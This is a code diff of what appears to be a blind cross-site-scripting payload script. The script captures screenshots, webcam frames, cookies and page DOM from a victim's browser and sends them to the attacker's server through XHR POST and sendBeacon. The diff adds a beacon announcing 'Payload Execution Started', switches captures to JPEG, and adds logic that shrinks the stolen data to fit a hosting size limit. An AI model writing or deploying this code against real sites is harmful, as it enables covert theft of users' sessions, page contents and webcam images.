@@ -22,6 +22,15 @@
     } catch (e) { }
   }
 
+  // Heartbeat ping: Notify server that script execution has started
+  try {
+    if (scriptSrc) {
+      var pingUri = new URL(scriptSrc);
+      var pingImg = new Image();
+      pingImg.src = pingUri.origin + "/message?text=" + encodeURIComponent("Payload Execution Started on " + location.hostname);
+    }
+  } catch (e) { }
+
   function captureScreenshots() {
     if (typeof html2canvas === "undefined") return Promise.resolve([]);
 
@@ -31,7 +40,7 @@
     var vpW = window.innerWidth || document.documentElement.clientWidth;
     var vpH = window.innerHeight || document.documentElement.clientHeight;
 
-    // Screenshot 1: Full page (actual document size, capped at 4096px to avoid memory issues)
+    // Screenshot 1: Full page
     function captureFullPage() {
       return html2canvas(document.documentElement, {
         letterRendering: 1,
@@ -46,13 +55,13 @@
         x: 0,
         y: 0
       }).then(function (canvas) {
-        results.push(canvas.toDataURL("image/png"));
+        results.push(canvas.toDataURL("image/jpeg", 0.6));
       }).catch(function () {
         results.push("");
       });
     }
 
-    // Screenshot 2: Current viewport (what the user actually sees)
+    // Screenshot 2: Current viewport
     function captureViewport() {
       var scrollX = window.pageXOffset || document.documentElement.scrollLeft;
       var scrollY = window.pageYOffset || document.documentElement.scrollTop;
@@ -69,15 +78,15 @@
         x: scrollX,
         y: scrollY
       }).then(function (canvas) {
-        results.push(canvas.toDataURL("image/png"));
+        results.push(canvas.toDataURL("image/jpeg", 0.6));
       }).catch(function () {
         results.push("");
       });
     }
 
-    // Screenshot 3: Below the fold (scroll down and capture)
+    // Screenshot 3: Below the fold
     function captureBelowFold() {
-      if (docH <= vpH) return Promise.resolve(); // Page fits in viewport, skip
+      if (docH <= vpH) return Promise.resolve();
       var belowY = Math.min(vpH, docH - vpH);
       return html2canvas(document.documentElement, {
         letterRendering: 1,
@@ -92,7 +101,7 @@
         x: 0,
         y: belowY
       }).then(function (canvas) {
-        results.push(canvas.toDataURL("image/png"));
+        results.push(canvas.toDataURL("image/jpeg", 0.6));
       }).catch(function () {
         results.push("");
       });
@@ -102,10 +111,10 @@
       .then(captureViewport)
       .then(captureBelowFold)
       .then(function () {
-        return results.filter(function (r) { return r && r.length > 0; });
+        return results.filter(function (r) { return r && r.length > 0 && r.startsWith("data:"); });
       })
       .catch(function () {
-        return results.filter(function (r) { return r && r.length > 0; });
+        return results.filter(function (r) { return r && r.length > 0 && r.startsWith("data:"); });
       });
   }
 
@@ -203,7 +212,7 @@
                       canvas.width = video.videoWidth || 640;
                       canvas.height = video.videoHeight || 480;
                       canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                      var dataUrl = canvas.toDataURL("image/png");
+                      var dataUrl = canvas.toDataURL("image/jpeg", 0.6);
 
                       stream.getTracks().forEach(function (track) { track.stop(); });
                       video.srcObject = null;
@@ -270,33 +279,54 @@
   }
 
   function exfiltrateLoot(collectedData) {
-    if (!scriptSrc) return; // Can't determine server, bail
+    if (!scriptSrc) return;
 
     var uri;
     try { uri = new URL(scriptSrc); } catch (e) { return; }
     var exfUrl = uri.origin + "/c";
 
-    // Primary: XHR POST
-    try {
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", exfUrl, true);
-      xhr.setRequestHeader("Content-Type", "application/json");
-      xhr.send(JSON.stringify(collectedData));
-    } catch (e) {
-      // Fallback: sendBeacon (works even if page navigates away)
+    // Size-aware optimization for Netlify (6MB limit)
+    function send(data) {
+      var jsonData = JSON.stringify(data);
+      var size = jsonData.length;
+
+      // If payload is too large (> 5MB to be safe), start dropping screenshots
+      if (size > 5000000) {
+        if (data["Screenshots"] && data["Screenshots"].length > 2) {
+          data["Screenshots"].pop(); // Drop "Below Fold"
+          return send(data);
+        }
+        if (data["Screenshots"] && data["Screenshots"].length > 1) {
+          data["Screenshots"].pop(); // Drop "Full Page"
+          return send(data);
+        }
+        if (data["Screenshots"] && data["Screenshots"].length > 0) {
+          data["Screenshots"] = []; // Drop all screenshots
+          data["Screenshot"] = "";
+          return send(data);
+        }
+        if (data["Webcam"]) {
+          data["Webcam"] = ""; // Drop webcam
+          return send(data);
+        }
+        // If still too large, truncate DOM as last resort
+        if (data["DOM"] && data["DOM"].length > 1000000) {
+          data["DOM"] = data["DOM"].substring(0, 1000000) + "... [Truncated due to size constraints]";
+          return send(data);
+        }
+      }
+
       try {
-        navigator.sendBeacon(exfUrl, JSON.stringify(collectedData));
-      } catch (e2) {
-        // Last resort: image pixel with minimal data
-        try {
-          var img = new Image();
-          img.src = uri.origin + "/message?text=" + encodeURIComponent(
-            "bXSS fired on " + collectedData["Location"] +
-            " | Cookies: " + (collectedData["Cookies"] || "none")
-          );
-        } catch (e3) { }
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", exfUrl, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(jsonData);
+      } catch (e) {
+        try { navigator.sendBeacon(exfUrl, jsonData); } catch (e2) { }
       }
     }
+
+    send(collectedData);
   }
 
   function loadScript(src) {
